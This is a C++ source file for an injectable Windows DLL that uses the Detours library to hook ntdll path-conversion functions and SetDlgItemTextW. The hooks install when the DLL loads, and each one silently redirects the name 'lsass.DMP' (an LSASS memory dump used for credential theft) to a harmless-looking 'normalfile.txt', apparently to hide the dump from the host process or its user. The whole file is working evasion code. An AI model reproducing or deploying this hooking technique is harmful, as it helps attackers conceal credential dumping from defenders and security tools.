#include "pch.h"
#include <Windows.h>
#include <winternl.h>
#include <detours.h>
#include <cstdio>
#include <iostream>

typedef struct _RTL_RELATIVE_NAME_U* PRTL_RELATIVE_NAME_U;

typedef BYTE BOOLEAN, *PBOOLEAN;

static VOID (NTAPI *Real_RtlInitUnicodeString) (PUNICODE_STRING DestinationString, PCWSTR SourceString) = NULL;

static NTSTATUS (NTAPI *Real_RtlInitUnicodeStringEx) (UNICODE_STRING* DestinationString, PCWSTR SourceString) = NULL;

static BOOLEAN (NTAPI* Real_RtlDosPathNameToRelativeNtPathName_U) (PCWSTR DosName, PUNICODE_STRING NtName, PCWSTR* PartName, PRTL_RELATIVE_NAME_U RelativeName);

static NTSTATUS (NTAPI* Real_RtlDosPathNameToRelativeNtPathName_U_WithStatus) (PCWSTR DosFileName, PUNICODE_STRING NtFileName, PCWSTR* FilePath, PRTL_RELATIVE_NAME_U RelativeName, PWSTR* FreeBuffer);

static BOOL(WINAPI* pSetDlgItemTextW) (HWND hDlg, int nIDDlgItem, LPCWSTR lpString) = SetDlgItemTextW;


static NTSTATUS NTAPI __stdcall hookedRtlDosPathNameToRelativeNtPathName_U_WithStatus (PCWSTR DosFileName, PUNICODE_STRING NtFileName, PCWSTR* FilePath, PRTL_RELATIVE_NAME_U RelativeName, PWSTR* FreeBuffer)
{
    PCWSTR newStr = L"C:\\Users\\djreu\\AppData\\Local\\Temp\\normalfile.txt";

    if (lstrcmpiW(DosFileName, L"C:\\Users\\djreu\\AppData\\Local\\Temp\\lsass.DMP") == 0)
    {
        return Real_RtlDosPathNameToRelativeNtPathName_U_WithStatus(newStr, NtFileName, FilePath, RelativeName, FreeBuffer);
    }
    return Real_RtlDosPathNameToRelativeNtPathName_U_WithStatus(DosFileName, NtFileName, FilePath, RelativeName, FreeBuffer);
}

static BOOLEAN NTAPI __stdcall hookedRtlDosPathNameToRelativeNtPathName_U(PCWSTR DosName, PUNICODE_STRING NtName, PCWSTR* PartName, PRTL_RELATIVE_NAME_U RelativeName)
{
    PCWSTR newStr = L"C:\\Users\\djreu\\AppData\\Local\\Temp\\normalfile.txt";

    if (lstrcmpiW(DosName, L"C:\\Users\\djreu\\AppData\\Local\\Temp\\lsass.DMP") == 0)
    {
        return Real_RtlDosPathNameToRelativeNtPathName_U(newStr, NtName, PartName, RelativeName);
    }
    return Real_RtlDosPathNameToRelativeNtPathName_U(DosName, NtName, PartName, RelativeName);
}

static VOID NTAPI __stdcall hookedRtlInitUnicodeString(PUNICODE_STRING DestinationString, PCWSTR SourceString)
{
    PCWSTR newStr = L"C:\\Users\\djreu\\AppData\\Local\\Temp\\normalfile.txt";

    if (lstrcmpiW(SourceString, L"C:\\Users\\djreu\\AppData\\Local\\Temp\\lsass.DMP") == 0)
    {
        return Real_RtlInitUnicodeString(DestinationString, newStr);
    }
    return Real_RtlInitUnicodeString(DestinationString, SourceString);
}

static NTSTATUS NTAPI __stdcall hookedRtlInitUnicodeStringEx(UNICODE_STRING* DestinationString, PCWSTR SourceString)
{
    PCWSTR newStr = L"C:\\Users\\djreu\\AppData\\Local\\Temp\\normalfile.txt";

    if (lstrcmpiW(SourceString, L"C:\\Users\\djreu\\AppData\\Local\\Temp\\lsass.DMP") == 0)
    {
        return Real_RtlInitUnicodeStringEx(DestinationString, newStr);
    }
    return Real_RtlInitUnicodeStringEx(DestinationString, SourceString);
}

BOOL hookedSetDlgItemTextW(HWND hDlg, int nIDDlgItem, LPCWSTR lpString)
{
    LPCWSTR newStr = L"C:\\Users\\djreu\\AppData\\Local\\Temp\\normalfile.txt";

    if (wcscmp(lpString, L"C:\\Users\\djreu\\AppData\\Local\\Temp\\lsass.DMP") == 0)
    {
        return pSetDlgItemTextW(hDlg, nIDDlgItem, newStr);
    }
    return TRUE;
}

BOOL setHooks()
{
    DetourRestoreAfterWith();

    Real_RtlInitUnicodeString   = ((VOID (NTAPI *) (PUNICODE_STRING, PCWSTR)) DetourFindFunction("ntdll.dll", "RtlInitUnicodeString"));
    Real_RtlInitUnicodeStringEx = ((NTSTATUS (NTAPI *) (UNICODE_STRING*, PCWSTR)) DetourFindFunction("ntdll.dll", "RtlInitUnicodeStringEx"));
    Real_RtlDosPathNameToRelativeNtPathName_U            = ((BOOLEAN (NTAPI* ) (PCWSTR, PUNICODE_STRING, PCWSTR*, PRTL_RELATIVE_NAME_U)) DetourFindFunction("ntdll.dll", "RtlDosPathNameToRelativeNtPathName_U"));
    Real_RtlDosPathNameToRelativeNtPathName_U_WithStatus = ((NTSTATUS (NTAPI* ) (PCWSTR, PUNICODE_STRING, PCWSTR*, PRTL_RELATIVE_NAME_U, PWSTR*)) DetourFindFunction("ntdll.dll", "RtlDosPathNameToRelativeNtPathName_U_WithStatus"));

    DetourTransactionBegin();

    DetourUpdateThread(GetCurrentThread());

    DetourAttach(&(PVOID&) Real_RtlInitUnicodeString, hookedRtlInitUnicodeString);
    DetourAttach(&(PVOID&) Real_RtlInitUnicodeStringEx, hookedRtlInitUnicodeStringEx);
    DetourAttach(&(PVOID&) Real_RtlDosPathNameToRelativeNtPathName_U, hookedRtlDosPathNameToRelativeNtPathName_U);
    DetourAttach(&(PVOID&) Real_RtlDosPathNameToRelativeNtPathName_U_WithStatus, hookedRtlDosPathNameToRelativeNtPathName_U_WithStatus);
    DetourAttach(&(PVOID&) pSetDlgItemTextW, hookedSetDlgItemTextW);

    DetourTransactionCommit();

    return TRUE;
}

BOOL removeHooks()
{
    DetourTransactionBegin();

    DetourUpdateThread(GetCurrentThread());

    DetourDetach(&(PVOID&)Real_RtlInitUnicodeString, hookedRtlInitUnicodeString);
    DetourDetach(&(PVOID&) Real_RtlInitUnicodeStringEx, hookedRtlInitUnicodeStringEx);
    DetourDetach(&(PVOID&) Real_RtlDosPathNameToRelativeNtPathName_U, hookedRtlDosPathNameToRelativeNtPathName_U);
    DetourDetach(&(PVOID&) Real_RtlDosPathNameToRelativeNtPathName_U_WithStatus, hookedRtlDosPathNameToRelativeNtPathName_U_WithStatus);
    DetourDetach(&(PVOID&)pSetDlgItemTextW, hookedSetDlgItemTextW);

    DetourTransactionCommit();

    return TRUE;
}

BOOL APIENTRY DllMain( HMODULE hModule,
                       DWORD  ul_reason_for_call,
                       LPVOID lpReserved
                     )
{
    switch (ul_reason_for_call)
    {
    case DLL_PROCESS_ATTACH:
		if (DetourIsHelperProcess())
		{
			return TRUE;
		}
        setHooks();
        break;
    case DLL_THREAD_ATTACH:
        break;
    case DLL_THREAD_DETACH:
        break;
    case DLL_PROCESS_DETACH:
        removeHooks();
        break;
    }
    return TRUE;
}

